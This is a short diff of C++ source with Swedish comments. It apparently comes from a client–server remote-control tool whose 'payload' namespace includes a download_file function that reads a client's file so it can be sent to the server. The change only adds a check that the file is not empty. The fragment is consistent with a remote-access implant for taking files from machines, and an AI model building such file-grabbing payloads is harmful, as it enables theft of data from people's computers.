@@ -75,7 +75,7 @@ namespace payload { // payload funktioner som används för att utföra någonting p
 	}
 	// om man vill ladda ner en fil från klienten till servern
 	std::string download_file(std::string program) {
-		if (std::filesystem::exists(program) && !std::filesystem::is_directory(program)) { // om filen exsiterar och inte är en mapp
+		if (std::filesystem::exists(program) && !std::filesystem::is_directory(program) && std::filesystem::file_size(program) > 0) { // om filen exsiterar och inte är en mapp
 			std::ifstream file(program, std::ios::binary); // läs in filen binärt
 			return std::string((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>()); // konvertera filen till en sträng med itrator konstruktion
 		}
